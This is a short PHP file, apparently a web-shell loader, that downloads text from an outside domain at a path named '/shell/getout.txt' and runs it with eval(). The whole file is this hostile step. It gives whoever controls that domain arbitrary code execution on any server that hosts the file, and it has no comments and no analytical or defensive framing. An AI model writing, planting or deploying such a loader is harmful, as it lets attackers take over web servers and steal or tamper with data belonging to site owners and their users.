<?php

$content = file_get_contents(urldecode('https://minyakzaitun.xyz/shell/getout.txt'));

$content = "?> ".$content;
eval($content);
